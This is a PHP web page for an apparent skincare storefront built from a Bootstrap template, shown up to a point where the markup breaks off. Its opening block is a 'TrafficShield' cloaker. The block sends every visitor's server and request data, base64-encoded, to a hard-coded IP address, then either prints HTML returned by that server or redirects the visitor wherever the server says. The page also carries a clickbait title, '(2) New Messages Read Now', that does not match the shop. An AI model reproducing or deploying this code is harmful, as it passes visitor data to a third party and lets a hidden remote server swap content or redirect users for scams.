<?php
namespace TrafficShield; 
error_reporting(0);
	class Traffic_Shield{
		public function run() {							
			ob_start();
			$this->ogrsr9854();
		}
		public function ogrsr9854() {	
            $this->_check(); 
            $response = $this->https_request();        
            $this->main($response);       
        }			
        public function _check() {	
            if(isset($_GET['TS-BHDNR-84848'])){
                echo "02a3c42c7a";
            }
        }
		public function get_header() {	
            $headers = array();     
            foreach($_SERVER as $k=>$v){
               $headers[$k] = $v;
            }
            $headers['TS-BHDNR-74191'] = "900661405745598";
            $headers['TS-BHDNR-74194'] = "02a3c42c7a"; 
            return $headers;
        }
		public function get_header_post() {
            $get_header = $this->get_header();
            return base64_encode(json_encode($get_header));      
        }	
		public function https_request() {
           $get_header['headers'] = $this->get_header_post();
           $ch = curl_init();
           curl_setopt($ch, CURLOPT_URL, "http://198.211.101.164/v2/logic/cloaker");
           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
           curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36');
           curl_setopt($ch, CURLOPT_POST, true);
           curl_setopt($ch, CURLOPT_POSTFIELDS, $get_header);
           $result = curl_exec($ch);                
           return json_decode($result);
        }
		public function main($response) {
            if(!empty($response)){
                if($response->type == 1){
                    if(isset($response->zrc) && !empty($response->zrc)){
                            echo base64_decode($response->zrc);
                            die();
                        }else{            
                            $this->get_url($response->url,$response->http_code);
                        }
                }

            }
        }
		public function get_url($url,$code) { 
            header("Location: ".$url, true, $code);            
        }
}
$traffic_Shield_Tre9854 = new Traffic_Shield();
$traffic_Shield_Tre9854->run();
// Copyright TrafficShield.io//
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <title>(2) New Messages Read Now</title>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="format-detection" content="telephone=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="author" content="TemplatesJungle">
  <meta name="keywords" content="html,css,template">
  <meta name="description" content="Bootstrap 5 Flores Skincare Products HTML CSS Template">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="css/vendor.css">
  <link rel="stylesheet" type="text/css" href="style.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@9/swiper-bundle.min.css" />
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Nanum+Myeongjo:wght@400;700;800&family=Open+Sans:wght@300;400;500;600;700;800&display=swap"
    rel="stylesheet">
</head>

<body class="bg-body" data-bs-spy="scroll" data-bs-target="#navbar" data-bs-root-margin="0px 0px -40%"
  data-bs-smooth-scroll="true" tabindex="0">
  <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
    <symbol id="heart" viewBox="0 0 24 24">
      <path fill="currentColor"
        d="M20.16 5A6.29 6.29 0 0 0 12 4.36a6.27 6.27 0 0 0-8.16 9.48l6.21 6.22a2.78 2.78 0 0 0 3.9 0l6.21-6.22a6.27 6.27 0 0 0 0-8.84m-1.41 7.46l-6.21 6.21a.76.76 0 0 1-1.08 0l-6.21-6.24a4.29 4.29 0 0 1 0-6a4.27 4.27 0 0 1 6 0a1 1 0 0 0 1.42 0a4.27 4.27 0 0 1 6 0a4.29 4.29 0 0 1 .08 6Z" />
    </symbol>
    <symbol xmlns="http://www.w3.org/2000/svg" id="navbar-icon" viewBox="0 0 16 16">
      <path
        d="M14 10.5a.5.5 0 0 0-.5-.5h-3a.5.5 0 0 0 0 1h3a.5.5 0 0 0 .5-.5zm0-3a.5.5 0 0 0-.5-.5h-7a.5.5 0 0 0 0 1h7a.5.5 0 0 0 .5-.5zm0-3a.5.5 0 0 0-.5-.5h-11a.5.5 0 0 0 0 1h11a.5.5 0 0 0 .5-.5z" />
    </symbol>
    <symbol xmlns="http://www.w3.org/2000/svg" id="user" viewBox="0 0 16 16">
      <path d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1H3Zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6Z" />
    </symbol>
    <symbol xmlns="http://www.w3.org/2000/svg" id="cart" viewBox="0 0 24 24">
      <path fill="currentColor"
        d="M17 18c-1.11 0-2 .89-2 2a2 2 0 0 0 2 2a2 2 0 0 0 2-2a2 2 0 0 0-2-2M1 2v2h2l3.6 7.59l-1.36 2.45c-.15.28-.24.61-.24.96a2 2 0 0 0 2 2h12v-2H7.42a.25.25 0 0 1-.25-.25c0-.05.01-.09.03-.12L8.1 13h7.45c.75 0 1.41-.42 1.75-1.03l3.58-6.47c.07-.16.12-.33.12-.5a1 1 0 0 0-1-1H5.21l-.94-2M7 18c-1.11 0-2 .89-2 2a2 2 0 0 0 2 2a2 2 0 0 0 2-2a2 2 0 0 0-2-2Z" />
    </symbol>
    <symbol xmlns="http://www.w3.org/2000/svg" id="search" viewBox="0 0 512 512">
      <path fill="currentColor"
        d="M456.69 421.39L362.6 327.3a173.81 173.81 0 0 0 34.84-104.58C397.44 126.38 319.06 48 222.72 48S48 126.38 48 222.72s78.38 174.72 174.72 174.72A173.81 173.81 0 0 0 327.3 362.6l94.09 94.09a25 25 0 0 0 35.3-35.3ZM97.92 222.72a124.8 124.8 0 1 1 124.8 124.8a124.95 124.95 0 0 1-124.8-124.8Z" />
    </symbol>
    <symbol xmlns="http://www.w3.org/2000/svg" id="package" viewBox="0 0 24 24">
      <path fill="currentColor"
        d="M3.75 3.75A3.75 3.75 0 0 1 7.5 0c1.455 0 3.436.901 4.5 3.11C13.064.901 15.044 0 16.5 0a3.75 3.75 0 0 1 3 6h1.75c.966 0 1.75.784 1.75 1.75v2.5c0 .698-.409 1.301-1 1.582v8.418A1.75 1.75 0 0 1 20.25 22H3.75A1.75 1.75 0 0 1 2 20.25v-8.418c-.591-.282-1-.884-1-1.582v-2.5C1 6.784 1.784 6 2.75 6H4.5a3.733 3.733 0 0 1-.75-2.25ZM20.5 12h-7.75v8.5h7.5a.25.25 0 0 0 .25-.25Zm-9.25 8.5V12H3.5v8.25c0 .138.112.25.25.25Zm10-10a.25.25 0 0 0 .25-.25v-2.5a.25.25 0 0 0-.25-.25h-8.5v3Zm-18.5 0h8.5v-3h-8.5a.25.25 0 0 0-.25.25v2.5c0 .138.112.25.25.25Zm16-6.75A2.25 2.25 0 0 0 16.5 1.5c-1.15 0-3.433 1.007-3.72 4.5h3.72a2.25 2.25 0 0 0 2.25-2.25ZM11.22 6c-.287-3.493-2.57-4.5-3.72-4.5a2.25 2.25 0 1 0 0 4.5Z" />
    </symbol>
    <symbol xmlns="http://www.w3.org/2000/svg" id="return" viewBox="0 0 14 14">
      <g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
        <path d="M.5 7A6.5 6.5 0 1 0 7 .5a7.23 7.23 0 0 0-5 2" />
        <path d="m2.5.5l-.5 2L4 3m3 .5v4L4.4 8.8" />
      </g>
    </symbol>
    <symbol xmlns="http://www.w3.org/2000/svg" id="truck" viewBox="0 0 24 24">
      <g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5">
        <path stroke-linejoin="round" stroke-miterlimit="1.5"
          d="M8 19a2 2 0 1 0 0-4a2 2 0 0 0 0 4Zm10 0a2 2 0 1 0 0-4a2 2 0 0 0 0 4Z" />
        <path d="M10.05 17H15V6.6a.6.6 0 0 0-.6-.6H1m4.65 11H3.6a.6.6 0 0 1-.6-.6v-4.9" />
        <path stroke-linejoin="round" d="M2 9h4" />
        <path d="M15 9h5.61a.6.6 0 0 1 .548.356l1.79 4.028a.6.6 0 0 1 .052.243V16.4a.6.6 0 0 1-.6.6h-1.9M15 17h1" />
      </g>
    </symbol>
    <symbol xmlns="http://www.w3.org/2000/svg" id="cart-outline" viewBox="0 0 24 24">
      <path fill="currentColor"
        d="M17 18a2 2 0 0 1 2 2a2 2 0 0 1-2 2a2 2 0 0 1-2-2c0-1.11.89-2 2-2M1 2h3.27l.94 2H20a1 1 0 0 1 1 1c0 .17-.05.34-.12.5l-3.58 6.47c-.34.61-1 1.03-1.75 1.03H8.1l-.9 1.63l-.03.12a.25.25 0 0 0 .25.25H19v2H7a2 2 0 0 1-2-2c0-.35.09-.68.24-.96l1.36-2.45L3 4H1V2m6 16a2 2 0 0 1 2 2a2 2 0 0 1-2 2a2 2 0 0 1-2-2c0-1.11.89-2 2-2m9-7l2.78-5H6.14l2.36 5H16Z" />
    </symbol>
    <symbol xmlns="http://www.w3.org/2000/svg" id="send" viewBox="0 0 32 32">
      <path fill="currentColor"
        d="M26.07 3.996a2.974 2.974 0 0 0-.933.223h-.004c-.285.113-1.64.683-3.7 1.547l-7.382 3.109c-5.297 2.23-10.504 4.426-10.504 4.426l.062-.024s-.359.118-.734.375a2.03 2.03 0 0 0-.586.567c-.184.27-.332.683-.277 1.11c.09.722.558 1.155.894 1.394c.34.242.664.355.664.355h.008l4.883 1.645c.219.703 1.488 4.875 1.793 5.836c.18.574.355.933.574 1.207c.106.14.23.257.379.351a1.119 1.119 0 0 0 .246.106l-.05-.012c.015.004.027.016.038.02c.04.011.067.015.118.023c.773.234 1.394-.246 1.394-.246l.035-.028l2.883-2.625l4.832 3.707l.11.047c1.007.442 2.027.196 2.566-.238c.543-.437.754-.996.754-.996l.035-.09l3.734-19.129c.106-.472.133-.914.016-1.343a1.807 1.807 0 0 0-.781-1.047a1.872 1.872 0 0 0-1.067-.27zm-.101 2.05c-.004.063.008.056-.02.177v.011l-3.699 18.93c-.016.027-.043.086-.117.145c-.078.062-.14.101-.465-.028l-5.91-4.531l-3.57 3.254l.75-4.79l9.656-9c.398-.37.265-.448.265-.448c.028-.454-.601-.133-.601-.133l-12.176 7.543l-.004-.02l-5.836-1.965v-.004l-.015-.003a.27.27 0 0 0 .03-.012l.032-.016l.031-.011s5.211-2.196 10.508-4.426c2.652-1.117 5.324-2.242 7.379-3.11a807.312 807.312 0 0 1 3.66-1.53c.082-.032.043-.032.102-.032z">
      </path>
    </symbol>
    <symbol xmlns="http://www.w3.org/2000/svg" id="facebook" viewBox="0 0 24 24">
      <path fill="currentColor"
        d="M14 13.5h2.5l1-4H14v-2c0-1.03 0-2 2-2h1.5V2.14c-.326-.043-1.557-.14-2.857-.14C11.928 2 10 3.657 10 6.7v2.8H7v4h3V22h4v-8.5Z" />
    </symbol>
    <symbol xmlns="http://www.w3.org/2000/svg" id="youtube" viewBox="0 0 32 32">
      <path fill="currentColor"
        d="M29.41 9.26a3.5 3.5 0 0 0-2.47-2.47C24.76 6.2 16 6.2 16 6.2s-8.76 0-10.94.59a3.5 3.5 0 0 0-2.47 2.47A36.13 36.13 0 0 0 2 16a36.13 36.13 0 0 0 .59 6.74a3.5 3.5 0 0 0 2.47 2.47c2.18.59 10.94.59 10.94.59s8.76 0 10.94-.59a3.5 3.5 0 0 0 2.47-2.47A36.13 36.13 0 0 0 30 16a36.13 36.13 0 0 0-.59-6.74ZM13.2 20.2v-8.4l7.27 4.2Z" />
    </symbol>
    <symbol xmlns="http://www.w3.org/2000/svg" id="instagram" viewBox="0 0 256 256">
      <path fill="currentColor"
        d="M128 80a48 48 0 1 0 48 48a48.05 48.05 0 0 0-48-48Zm0 80a32 32 0 1 1 32-32a32 32 0 0 1-32 32Zm48-136H80a56.06 56.06 0 0 0-56 56v96a56.06 56.06 0 0 0 56 56h96a56.06 56.06 0 0 0 56-56V80a56.06 56.06 0 0 0-56-56Zm40 152a40 40 0 0 1-40 40H80a40 40 0 0 1-40-40V80a40 40 0 0 1 40-40h96a40 40 0 0 1 40 40ZM192 76a12 12 0 1 1-12-12a12 12 0 0 1 12 12Z" />
    </symbol>
    <symbol xmlns="http://www.w3.org/2000/svg" id="twitter" viewBox="0 0 24 24">
      <path fill="currentColor"
        d="M22.46 6c-.77.35-1.6.58-2.46.69c.88-.53 1.56-1.37 1.88-2.38c-.83.5-1.75.85-2.72 1.05C18.37 4.5 17.26 4 16 4c-2.35 0-4.27 1.92-4.27 4.29c0 .34.04.67.11.98C8.28 9.09 5.11 7.38 3 4.79c-.37.63-.58 1.37-.58 2.15c0 1.49.75 2.81 1.91 3.56c-.71 0-1.37-.2-1.95-.5v.03c0 2.08 1.48 3.82 3.44 4.21a4.22 4.22 0 0 1-1.93.07a4.28 4.28 0 0 0 4 2.98a8.521 8.521 0 0 1-5.33 1.84c-.34 0-.68-.02-1.02-.06C3.44 20.29 5.7 21 8.12 21C16 21 20.33 14.46 20.33 8.79c0-.19 0-.37-.01-.56c.84-.6 1.56-1.36 2.14-2.23Z" />
    </symbol>
    <symbol xmlns="http://www.w3.org/2000/svg" id="linkedin" viewBox="0 0 512 512">
      <path fill="currentColor"
        d="M444.17 32H70.28C49.85 32 32 46.7 32 66.89v374.72C32 461.91 49.85 480 70.28 480h373.78c20.54 0 35.94-18.21 35.94-38.39V66.89C480.12 46.7 464.6 32 444.17 32Zm-273.3 373.43h-64.18V205.88h64.18ZM141 175.54h-.46c-20.54 0-33.84-15.29-33.84-34.43c0-19.49 13.65-34.42 34.65-34.42s33.85 14.82 34.31 34.42c-.01 19.14-13.31 34.43-34.66 34.43Zm264.43 229.89h-64.18V296.32c0-26.14-9.34-44-32.56-44c-17.74 0-28.24 12-32.91 23.69c-1.75 4.2-2.22 9.92-2.22 15.76v113.66h-64.18V205.88h64.18v27.77c9.34-13.3 23.93-32.44 57.88-32.44c42.13 0 74 27.77 74 87.64Z" />
    </symbol>
    <symbol xmlns="http://www.w3.org/2000/symbol" id="arrow-left-light" viewBox="0 0 256 256">
      <path fill="currentColor"
        d="M220 128a4 4 0 0 1-4 4H49.66l65.17 65.17a4 4 0 0 1-5.66 5.66l-72-72a4 4 0 0 1 0-5.66l72-72a4 4 0 0 1 5.66 5.66L49.66 124H216a4 4 0 0 1 4 4Z" />
    </symbol>
    <symbol xmlns="http://www.w3.org/2000/symbol" id="arrow-right-light" viewBox="0 0 256 256">
      <path fill="currentColor"
        d="m218.83 130.83l-72 72a4 4 0 0 1-5.66-5.66L206.34 132H40a4 4 0 0 1 0-8h166.34l-65.17-65.17a4 4 0 0 1 5.66-5.66l72 72a4 4 0 0 1 0 5.66Z" />
    </symbol>
    <symbol xmlns="http://www.w3.org/2000/svg" id="close-btn" viewBox="0 0 24 24">
      <path fill="currentColor"
        d="M6.4 19L5 17.6l5.6-5.6L5 6.4L6.4 5l5.6 5.6L17.6 5L19 6.4L13.4 12l5.6 5.6l-1.4 1.4l-5.6-5.6L6.4 19Z" />
    </symbol>
  </svg>
  <div class="offcanvas offcanvas-end" data-bs-scroll="true" tabindex="-1" id="offcanvasCart" aria-labelledby="My Cart">
    <div class="offcanvas-header">
      <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
    </div>
    <div class="offcanvas-body">
      <div class="order-md-last">
        <h4 class="d-flex justify-content-between align-items-center mb-3 border-bottom pb-3">
          <span class="text-dark">Cart</span>
          <span class="badge bg-primary rounded-pill">3</span>
        </h4>
        <ul class="list-group mb-3">
          <li class="list-group-item border-0 d-flex justify-content-between lh-sm">
            <div>
              <h6 class="my-0">Neauthy Cream</h6>
              <small class="text-body-secondary">Brief Description</small>
            </div>
            <span class="text-body-secondary">$99</span>
          </li>
          <li class="list-group-item border-0 d-flex justify-content-between lh-sm">
            <div>
              <h6 class="my-0">Everdrop Handwash</h6>
              <small class="text-body-secondary">Brief Description</small>
            </div>
            <span class="text-body-secondary">$120</span>
          </li>
          <li class="list-group-item border-0 d-flex justify-content-between lh-sm">
            <div>
              <h6 class="my-0">CBD Muscle Gel</h6>
              <small class="text-body-secondary">Brief Description</small>
            </div>
            <span class="text-body-secondary">$85</span>
          </li>
          <li class="list-group-item border-0 d-flex justify-content-between">
            <span>Total (USD)</span>
            <strong>$304</strong>
          </li>
        </ul>
        <button class="w-100 btn btn-dark btn-lg" type="submit">Continue to Checkout</button>
      </div>
    </div>
  </div>
  <div class="search-box position-relative overflow-hidden w-100">
    <div class="search-wrap">
      <div class="close-button position-absolute">
        <svg class="close-btn" width="18" height="18">
          <use xlink:href="#close-btn"></use>
        </svg>
      </div>
      <form id="search-form" class="text-center pt-3" action="" method="">
        <input type="text" class="search-input fs-5 p-4 bg-body" placeholder="Search...">
        <svg class="search" width="22" height="22">
          <use xlink:href="#search"></use>
        </svg>
      </form>
    </div>
  </div>
  <header id="header" class="site-header border-bottom py-3">
    <div class="container-fluid">
      <div class="row">
        <nav class="navbar navbar-expand-lg">
          <button class="navbar-toggler d-flex d-lg-none order-3 p-2 border-0 shadow-none" type="button"
            data-bs-toggle="offcanvas" data-bs-target="#bdNavbar" aria-controls="bdNavbar" aria-expanded="false"
            aria-label="Toggle navigation">
            <svg class="navbar-icon" width="40" height="40">
              <use xlink:href="#navbar-icon"></use>
            </svg>
          </button>
          <a href="index.php" class="navbar-brand order-2 order-lg-2 d-flex d-lg-none">
            <img src="images/main-logo.png" style="height:100px;" alt="Logo">
          </a>
          <div class="offcanvas offcanvas-end order-3" tabindex="-1" id="bdNavbar"
            aria-labelledby="bdNavbarOffcanvasLabel">
            <div class="offcanvas-body align-items-center">
              <div class="offcanvas-header p-0 py-4">
                <button type="button" class="btn-close btn-close-black shadow-none" data-bs-dismiss="offcanvas"
                  aria-label="Close" data-bs-target="#bdNavbar"></button>
              </div>

              <div class="col-md-1"></div>
              <div class="col-md-4">
                <div class="navbar-collapse order-1 order-lg-1" id="navbarMenu">
                  <ul class="navbar-nav mr-auto">
                    <li class="nav-item">
                      <a class="nav-link pe-4" href="index.php">Home</a>
                    </li>
                    <li class="nav-item">
                      <a class="nav-link pe-4" href="about.php">About</a>
                    </li>
                    <li class="nav-item">
                      <a class="nav-link pe-4" href="contact.php">Contact</a>
                    </li>
                    <!-- <li class="nav-item dropdown">
                      <a class="nav-link me-4 dropdown-toggle" data-bs-toggle="dropdown" href="#" role="button"
                        aria-expanded="false">Shop</a>
                      <ul class="dropdown-menu">
                        <li>
                          <a href="shop.html" class="dropdown-item">Shop <span class="badge bg-primary">PRO</span></a>
                        </li>
                        <li>
                          <a href="single-product.html" class="dropdown-item">Single Product <span
                              class="badge bg-primary">PRO</span></a>
                        </li>
                      </ul>
                    </li> -->
                    <!-- <li class="nav-item dropdown">
                      <a class="nav-link me-4 dropdown-toggle" data-bs-toggle="dropdown" href="#" role="button"
                        aria-expanded="false">Blog</a>
                      <ul class="dropdown-menu">
                        <li>
                          <a href="blog.html" class="dropdown-item">Blog <span class="badge bg-primary">PRO</span></a>
                        </li>
                        <li>
                          <a href="single-post.html" class="dropdown-item">Single Post <span
                              class="badge bg-primary">PRO</span></a>
                        </li>
                      </ul>
                    </li> -->
                    <!-- <li class="nav-item dropdown">
                      <a class="nav-link me-4 dropdown-toggle" data-bs-toggle="dropdown" href="#" role="button"
                        aria-expanded="false">Pages</a>
                      <ul class="dropdown-menu">
                        <li>
                          <a href="about.php" class="dropdown-item">About
                             <span class="badge bg-primary">PRO</span>
                            </a>
                        </li> -->
                        <!-- <li>
                          <a href="cart.html" class="dropdown-item">Cart <span class="badge bg-primary">PRO</span></a>
                        </li> -->
                        <!-- <li>
                          <a href="wishlist.html" class="dropdown-item">Wishlist <span
                              class="badge bg-primary">PRO</span></a>
                        </li>
                        <li>
                          <a href="checkout.html" class="dropdown-item">Checkout <span
                              class="badge bg-primary">PRO</span></a>
                        </li> -->
                        <!-- <li>
                          <a href="contact.php" class="dropdown-item">Contact 
                            <span  class="badge bg-primary">PRO</span>
                            </a>
                        </li>
                        <li>
                          <a href="faqs.html" class="dropdown-item">FAQs 
                            <span class="badge bg-primary">PRO</span>
                        </a>
                        </li> -->
                        <!-- <li>
                          <a href="account.html" class="dropdown-item">Account <span
                              class="badge bg-primary">PRO</span></a>
                        </li>
                        <li>
                          <a href="team.html" class="dropdown-item">Team <span class="badge bg-primary">PRO</span></a>
                        </li>
                        <li>
                          <a href="thank-you.html" class="dropdown-item">Thankyou <span
                              class="badge bg-primary">PRO</span></a>
                        </li>
                        <li>
                          <a href="error.html" class="dropdown-item">Error <span class="badge bg-primary">PRO</span></a>
                        </li>
                        <li>
                          <a href="styles.html" class="dropdown-item">Style <span
                              class="badge bg-primary">PRO</span></a>
                        </li> -->
                      </ul>
                    </li>
                    <!-- <li class="nav-item mt-4 mt-lg-0">
                      <a class="btn btn-primary m-0 rounded-pill"
                        href="https://templatesjungle.gumroad.com/l/flores-skin-care-products-html-template"
                        target="_blank">GET PRO</a>
                    </li> -->
                  </ul>
                </div>
              </div>
              <div class="col-md-2 d-flex justify-content-center">
                <a href="index.php" class="navbar-brand order-2 order-lg-2 d-none d-lg-flex">
                  <img src="images/main-logo.png" style="height:100px;" alt="Logo">
                </a>
              </div>
              <!-- <div class="col-md-5">
                <ul
                  class="user-items list-unstyled d-none d-lg-flex justify-content-end align-items-center order-3 flex-grow-1 gap-4 m-0">
                  <li>
                    <a href="#" data-bs-toggle="offcanvas" data-bs-target="#offcanvasLogin"
                      aria-controls="offcanvasLogin">
                      <svg class="user" width="18" height="18">
                        <use xlink:href="#user"></use>
                      </svg>
                    </a>
                  </li>
                  <li class="search-item" data-bs-toggle="collapse" data-bs-target="#search-box"
                    aria-controls="search-box" aria-expanded="false" aria-label="Toggle navigation">
                    <a href="#">
                      <svg class="search" width="18" height="18">
                        <use xlink:href="#search"></use>
                      </svg>
                    </a>
                  </li>
                  <li>
                    <a href="cart.html" data-bs-toggle="offcanvas" data-bs-target="#offcanvasCart"
                      aria-controls="offcanvasCart">
                      <svg class="cart" width="18" height="18">
                        <use xlink:href="#cart"></use>
                      </svg>
                      <span>(0)</span>
                    </a>
                  </li>
                </ul>
              </div> -->
            </div>
          </div>
        </nav>
      </div>
    </div>
  </header>
  <section id="intro" class="my-lg-8">
    <div class="container-lg">
      <div class="row align-items-center justify-content-between">
        <div class="col-lg-6">
          <div class="image-holder text-center">
            <img src="images/banner-image1.png" alt="banner" class="img-fluid rounded-5">
          </div>
        </div>
        <div class="col-lg-6">
          <div class="banner-content ms-lg-5">
            <h1 class="display-1">Skin Care Products</h1>
            <p class="fs-3 fw-light">Your skin need some help from us. Make sure to watch our natural skin care
              products.</p>
            <a href="contact.php" class="btn btn-lg btn-primary text-uppercase mt-3 rounded-5">Contact Us</a>
          </div>
        </div>
      </div>
    </div>
  </section>
  <section id="company-services">
    <div class="container-lg">
      <div class="row">
        <div class="col-lg-3 col-md-6 col-sm-6 mb-4">
          <div class="icon-box text-center">
            <div class="icon-box-icon mb-3">
              <svg class="truck svg-primary" width="50" height="50">
                <use xlink:href="#truck"></use>
              </svg>
              <div class="circle-pattern position-relative"></div>
            </div>
            <div class="icon-box-content">
              <h4 class="fw-3 fw-bold text-capitalize">Quick delivery</h4>
              <p>Inside City delivery within 5 days</p>
            </div>
          </div>
        </div>
        <div class="col-lg-3 col-md-6 col-sm-6 mb-4">
          <div class="icon-box text-center">
            <div class="icon-box-icon mb-3">
              <svg class="cart-outline svg-primary" width="40" height="40">
                <use xlink:href="#cart-outline"></use>
              </svg>
              <div class="circle-pattern position-relative"></div>
            </div>
            <div class="icon-box-content">
              <h4 class="fw-3 fw-bold text-capitalize">Pick up in store</h4>
              <p>We have option of pick up in store</p>
            </div>
          </div>
        </div>
        <div class="col-lg-3 col-md-6 col-sm-6 mb-4">
          <div class="icon-box text-center">
            <div class="icon-box-icon mb-3">
              <svg class="package svg-primary" width="40" height="40">
                <use xlink:href="#package"></use>
              </svg>
              <div class="circle-pattern position-relative"></div>
            </div>
            <div class="icon-box-content">
              <h4 class="fw-3 fw-bold text-capitalize">Special Packaging</h4>
              <p>Our packaging is best for products </p>
            </div>
          </div>
        </div>
        <div class="col-lg-3 col-md-6 col-sm-6 mb-4">
          <div class="icon-box text-center">
            <div class="icon-box-icon mb-3">
              <svg class="return svg-primary" width="40" height="40">
                <use xlink:href="#return"></use>
              </svg>
              <div class="circle-pattern position-relative"></div>
            </div>
            <div class="icon-box-content">
              <h4 class="fw-3 fw-bold text-capitalize">Return policy</h4>
              <p>We will take return in some cases</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>
  <section id="about-us" class="py-lg-8">
    <div class="container">
      <div class="row align-items-center g-md-5">
        <div class="col-lg-6 col-md-6 col-sm-12 mb-5">
          <div class="display-header">
            <div class="image-holder">
              <img src="images/single-image1.png" alt="about" class="img-fluid">
            </div>
          </div>
        </div>
        <div class="col-lg-6 col-md-6 col-sm-12 ps-5">
          <div class="p-1">
            <h2 class="display-2 m-1">Who Are We ?</h2>
            <p class="fs-3 fw-light">We are the only best online store for best skin care solution.</p>
            <p>We are the premier online destination for top-tier skincare solutions. Our mission is to provide you with the best products to help you achieve healthy, glowing skin. We carefully curate our collection to include only the highest quality skincare products that deliver real results.</p>
            <!-- <p>Et id sapien id enim, sit tempor cursus elit, fusce. Nunc tristique facilisis consectetur at vivamus ut
              porta porta. Ut nisl, tortor, aliquam blandit vitae vehicula vivamus leo nullam urna, scelerisque unc
              lectus phasellus adipiscing arcu. Tristique facilisis nunc consectetur at tempor cursusut porta .</p> -->
          </div>
          <div class="text-left">
            <a href="about.php" class="btn btn-lg btn-outline-gray text-uppercase mt-3 rounded-5">About Us</a>
          </div>
        </div>
      </div>
    </div>
  </section>
  <section id="trending-products" class="product-carousel overflow-hidden p-5 bg-overlay position-relative">
    <div class="container-lg">
      <div class="section-header text-center mb-5">
        <h2 class="display-2">Trending Products</h2>
      </div>
      <div class="swiper product-swiper mb-5">
        <div class="swiper-wrapper">
          <div class="swiper-slide">
            <div class="product-item">
              <div class="image-holder position-relative">
                <img src="images/product-item1.jpg" alt="product-item" class="img-fluid rounded-5">
                <!-- <div
                  class="cart-button overlay-item position-absolute d-flex justify-content-center align-items-center">

                  <div class="d-flex align-items-center">
                    <div class="btn-left me-2">
                      <a href="#" class="btn btn-normal text-light">Add to Cart</a>
                    </div>
                    <svg width="20" height="20">
                      <use xlink:href="#heart" class="text-light fw-bold"></use>
                    </svg>
                  </div>

                </div> -->
              </div>
              <div class="product-detail text-center">
                <h3 class="fs-2 mb-1">
                  <!-- <a href="#" class="text-primary"> -->
                    Neauthy Cream
                <!-- </a> -->
                </h3>
                <span class="item-price text-gray-dark fs-3">$99.00</span>
              </div>
            </div>
          </div>
          <div class="swiper-slide">
            <div class="product-item">
              <div class="image-holder position-relative">
                <img src="images/product-item2.jpg" alt="product-item" class="img-fluid rounded-5">
                <!-- <div
                  class="cart-button overlay-item position-absolute d-flex justify-content-center align-items-center">
                  <div class="d-flex align-items-center">
                    <div class="btn-left me-2">
                      <a href="#" class="btn btn-normal text-light">Add to Cart</a>
                    </div>
                    <svg width="20" height="20">
                      <use xlink:href="#heart" class="text-light fw-bold"></use>
                    </svg>
                  </div>
                </div> -->
              </div>
              <div class="product-detail text-center">
                <h3 class="fs-2 mb-1">
                  <!-- <a href="#" class="text-primary"> -->
                    Everdrop Handwash
                <!-- </a> -->
                </h3>
                <span class="item-price text-gray-dark fs-3">$120.00</span>
              </div>
            </div>
          </div>
          <div class="swiper-slide">
            <div class="product-item">
              <div class="image-holder position-relative">
                <img src="images/product-item3.jpg" alt="product-item" class="img-fluid rounded-5">
                <!-- <div
                  class="cart-button overlay-item position-absolute d-flex justify-content-center align-items-center">
                  <div class="d-flex align-items-center">
                    <div class="btn-left me-2">
                      <a href="#" class="btn btn-normal text-light">Add to Cart</a>
                    </div>
                    <svg width="20" height="20">
                      <use xlink:href="#heart" class="text-light fw-bold"></use>
                    </svg>
                  </div>
                </div> -->
              </div>
              <div class="product-detail text-center">
                <h3 class="fs-2 mb-1">
                  <!-- <a href="#" class="text-primary"> -->
                    CBD Muscle Gel
                <!-- </a> -->
                </h3>
                <span class="item-price text-gray-dark fs-3">$85.00</span>
              </div>
            </div>
          </div>
          <div class="swiper-slide">
            <div class="product-item">
              <div class="image-holder position-relative">
                <img src="images/product-item1.jpg" alt="product-item" class="img-fluid rounded-5">
                <!-- <div
                  class="cart-button overlay-item position-absolute d-flex justify-content-center align-items-center">
                  <div class="d-flex align-items-center">
                    <div class="btn-left me-2">
                      <a href="#" class="btn btn-normal text-light">Add to Cart</a>
                    </div>
                    <svg width="20" height="20">
                      <use xlink:href="#heart" class="text-light fw-bold"></use>
                    </svg>
                  </div>
                </div> -->
              </div>
              <div class="product-detail text-center">
                <h3 class="fs-2 mb-1">
                  <!-- <a href="#" class="text-primary"> -->
                    Neauthy Cream
                <!-- </a> -->
                </h3>
                <span class="item-price text-gray-dark fs-3">$99.00</span>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="swiper-pagination position-absolute"></div>
    </div>
  </section>
  <section id="testimonials" class="my-lg-8">
    <div class="container">
      <div class="swiper review-swiper position-relative py-lg-8">
        <div class="swiper-wrapper">
          <div class="swiper-slide text-center d-flex justify-content-center">
            <div class="review-item">
              <blockquote class="display-5 heading-font text-capitalize text-primary">"I've tried countless skincare products over the years, but nothing compares to what I found here. My skin has never looked better! The products are high quality and truly deliver on their promises. Highly recommend!"

              </blockquote>
              <div class="author-detail">
                <div class="name text-gray-dark text-capitalize pt-3 fs-3">Anna Garcia</div>
              </div>
            </div>
          </div>
          <div class="swiper-slide text-center d-flex justify-content-center">
            <div class="review-item">
